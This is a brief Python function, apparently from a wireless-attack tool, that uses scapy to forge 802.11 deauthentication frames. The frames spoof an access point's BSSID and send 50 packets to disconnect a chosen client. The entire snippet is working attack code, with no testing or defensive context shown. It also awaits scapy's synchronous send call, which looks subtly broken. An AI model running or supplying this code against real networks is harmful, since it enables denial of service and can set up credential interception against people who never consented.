from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap, sendp

async def send_deauth_packet(bssid: str, client_mac : str, device: str):
    packet = RadioTap() / Dot11(addr1=client_mac, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
    await sendp(packet, iface=device, count=50, verbose=False)